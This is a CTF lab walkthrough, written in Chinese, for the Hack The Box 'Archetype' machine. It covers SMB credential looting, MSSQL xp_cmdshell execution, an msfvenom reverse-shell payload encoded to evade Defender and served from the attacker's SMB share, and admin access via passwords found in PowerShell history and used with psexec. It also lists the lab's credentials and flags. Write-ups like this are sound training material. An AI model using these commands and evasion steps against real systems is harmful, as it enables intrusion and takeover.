# Archetype

## 掃 Port
- `rustscan -a 10.10.10.27 -r 1-65535`
	- ![](https://i.imgur.com/6PRRYI7.png)
- nmap 繼續掃
	- `nmap -A -p135,139,445,5985,47001,49664,49665,49666,49667,49669,49668 10.10.10.27`
		- ![](https://i.imgur.com/POqdmAS.png)
		- 一堆的 RPC
		- SMB
		- 1433 是 MSSQL
## SMB
- SMB 匿名登入
	- ![](https://i.imgur.com/Vg6LtQ4.png)
	- 發現 `backups`
- backups 資料夾
	- ![](https://i.imgur.com/0Dvwki0.png)
		- 一個 Config 載下來
	- ![](https://i.imgur.com/bnrHBxW.png)

- 取得密碼資訊
	- ![](https://i.imgur.com/fMJGZxe.png)
	- Host Name : `ARCHETYPE`
	- User ID : `sql_svc`
	- Password : `M3g4c0rp123`
## MSSQL
- 安裝 impacket
	- `sudo apt install python3-impacket`
- `impacket-mssqlclient -p 1433 sql_svc@10.10.10.27 -windows-auth`
	- ![](https://i.imgur.com/nGRTDxW.png)
- MSSQL 取得 Shell 就有機會可以 RCE
	- `exec xp_cmdshell '{指令}'`
- `systeminfo`
	- ![](https://i.imgur.com/WkKnCCm.png)
- `dir`
	- `exec xp_cmdshell 'dir'`
- 透過開啟本地 smb
	- `impacket-smbserver meow .`
- 準備 Reverse shell
	- `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.16 LPORT=7877 -e x86/shikata_ga_nai -f exe > shell.exe`
		- 經測試，不掛 `x86/shikata_ga_nai` 就會被 Defender 吃掉 
## Shell
- 執行 Shell
	- `exec xp_cmdshell '\\10.10.16.16\meow\shell.exe'`
	- ![](https://i.imgur.com/RpWsOBY.png)
- 收回 Reverse shell
	- ![](https://i.imgur.com/AMKdllY.png)
- 取得 User Flag
	- ![](https://i.imgur.com/8yVWCex.png)
	- `3e7b102e78218e935bf3f4951fec21a3`

## 嘗試提權
- Windows exploit suggester
	- `windows-exploit-suggester.py`
		- 壞ㄌ QQ 不支援 2019 
- WESNG
	- https://github.com/bitsadmin/wesng
	- 找不到洞 QQ
- `whoami /priv`
	- ![](https://i.imgur.com/aX6ZMTx.png)
	- 發現有 SeImpersonatePrivilege 
- SeImpersonatePrivilege  提權嘗試
	- https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-abusing-tokens
	- https://github.com/itm4n/PrintSpoofer
	- 失敗 QQ


- Powershell history
	- `%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` 
- Get Username and password
	- ![](https://i.imgur.com/AguSfHx.png)
	- Username : `administrator`
	- Password : `MEGACORP_4dm1n!!`
- Use psexec to get shell
	`impacket-psexec administrator:'MEGACORP_4dm1n!!'@10.10.10.27`
	- ![](https://i.imgur.com/t0a0s6i.png)
- Get root flag
	- ![](https://i.imgur.com/GWao8PG.png)
	- `b91ccec3305e98240082d4474b848528`

